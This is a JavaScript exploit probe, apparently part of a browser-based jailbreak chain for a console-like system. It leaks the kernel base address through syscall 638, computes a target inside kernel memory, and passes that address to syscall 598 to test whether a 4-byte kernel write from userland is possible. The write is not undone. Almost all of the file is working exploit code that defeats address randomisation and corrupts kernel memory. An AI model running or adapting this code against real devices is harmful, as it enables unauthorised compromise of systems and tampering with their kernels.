// KERNEL WRITE TEST: pass a kernel address to 598's output buffer.
// 598 (dynlib_get_proc_param) writes 4 bytes to arg1. We always passed
// a userland buffer. This probe passes kbase+0x3B1AABA0+0x1000 (middle
// of the 22KB uniform computation table) and checks whether the write
// lands by comparing 638 outputs before and after. If the CPU page
// tables block it (U/S bit), we get a WebProcess fault — expected on
// a properly configured system. If the write LANDS, the 638 output
// changes and we have kernel R/W from userland.
// Controls: baseline 638 readings at selectors 0, 0x1000, 0x2000,
// then the kernel write, then the same readings repeated.
// The probe does NOT restore — the write is 4 bytes into unused
// computation space.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys638 !== "number" ||
      typeof native.wrappers.sys598 !== "number")
    throw new Error("chain_missing");
  var frame = native.frame;
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("kwt_preflight");

  // Derive kbase via 638 sel=0
  phase = "derive_kbase";
  var out2Off = 0x1e00, out3Off = 0x1e10;
  var out2Addr = native.frameAddress + out2Off;
  var out3Addr = native.frameAddress + out3Off;
  var fv = new DataView(frame.buffer);
  var o2orig = Array.from(frame.subarray(out2Off, out2Off + 32));
  native.call("sys638", [0, out2Addr, out3Addr]);
  var klo = fv.getUint32(out2Off, true);
  var khi = fv.getUint32(out2Off + 4, true);
  var blo = (klo - 0x3B1AABA0) >>> 0;
  var bhi = khi;
  if (klo < 0x3B1AABA0) { blo = (klo - 0x3B1AABA0) >>> 0;
    bhi = (khi - 1) >>> 0; }
  mark("kwt_kbase_ok");

  // The kernel write target: kbase + 0x3B1AABA0 + 0x1000
  // = the middle of the uniform table region
  var TABLE_OFF = 0x3B1AABA0 + 0x1000;
  var wlo = (blo + TABLE_OFF) >>> 0;
  var whi = (bhi + ((blo + TABLE_OFF) > 0xffffffff ? 1 : 0)) >>> 0;
  var writeTarget = whi * 0x100000000 + wlo;
  mark("kwt_target_computed");

  // Baseline 638 readings at three selectors
  function read638(sel) {
    var r2o = 0x1dc0, r3o = 0x1de0;
    var r2a = native.frameAddress + r2o;
    var r3a = native.frameAddress + r3o;
    var sv = fv.getUint32(r2o, true);
    fv.setUint32(r2o, 0, true);
    fv.setUint32(r2o + 4, 0, true);
    native.call("sys638", [sel, r2a, r3a]);
    fv.setUint32(r2o, sv, true);
    var lo = fv.getUint32(r2o, true);
    var hi = fv.getUint32(r2o + 4, true);
    return lo.toString(16) + "_" + hi.toString(16);
  }
  var sel0_base = read638(0);
  var sel1k_base = read638(0x1000);
  var sel2k_base = read638(0x2000);
  mark("kwt_baseline");

  // Prepare a separate buffer for 598 to write to (we want to prove
  // 598 still works normally with a userland buffer)
  phase = "sanity_598";
  var sanityOff = 0x1a00;
  var sanityAddr = native.frameAddress + sanityOff;
  fv.setUint32(sanityOff, 0, true);
  fv.setUint32(sanityOff + 4, 0, true);
  native.call("sys598", [sanityAddr, out3Addr]);
  var sanityLo = fv.getUint32(sanityOff, true);
  mark("kwt_sanity_598");

  // THE KERNEL WRITE: pass kbase+0x3B1AABA0+0x1000 as 598's output
  // The address is > 2^44 so we need call64... but 598 takes two
  // 64-bit args (buf, sizePtr). We need call64 for this.
  phase = "kernel_write";
  mark("kwt_before_kernel_write");

  // Check if call64 is available (v26+)
  if (typeof native.call64 !== "function")
    throw new Error("call64_missing");
  var wlo32 = wlo >>> 0;
  var whi32 = whi >>> 0;
  // Call 598 with kernel address as output buffer, sizePtr = userland
  var kresult = native.call64("sys598",
    [[wlo32, whi32], [out3Addr % 0x100000000,
      Math.floor(out3Addr / 0x100000000)]]);
  var kerrno = (kresult.value === -1) ? native.readErrno() : null;
  mark("kwt_after_kernel_write_" + kresult.value + "/" +
    (kerrno === null ? "ok" : kerrno));

  // If we survive, read 638 again to check for changes
  phase = "post_read";
  var sel0_post = read638(0);
  var sel1k_post = read638(0x1000);
  var sel2k_post = read638(0x2000);
  var changed = (sel0_base !== sel0_post) ||
    (sel1k_base !== sel1k_post) || (sel2k_base !== sel2k_post);
  mark("kwt_post_read" + (changed ? "_CHANGED" : "_same"));

  for (var r = 0; r < 32; r++) frame[out2Off + r] = o2orig[r];
  var after = native.call("getpid", []);
  mark("kwt_done");
  result = { id: "kernel_write_test_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { kbase: bhi.toString(16) + (function (lo) {
        var h = lo.toString(16);
        while (h.length < 8) h = "0" + h;
        return h;
      })(blo),
      write_target: whi32.toString(16) + (function (lo) {
        var h = wlo32.toString(16);
        while (h.length < 8) h = "0" + h;
        return h;
      })(),
      k598_ret: kresult.value,
      k598_errno: kerrno === null ? "ok" : kerrno,
      sel0_base: sel0_base, sel0_post: sel0_post,
      sel1k_base: sel1k_base, sel1k_post: sel1k_post,
      sel2k_base: sel2k_base, sel2k_post: sel2k_post,
      changed: changed ? 1 : 0,
      sanity_598_lo: sanityLo.toString(16),
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "kernel_write_test_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
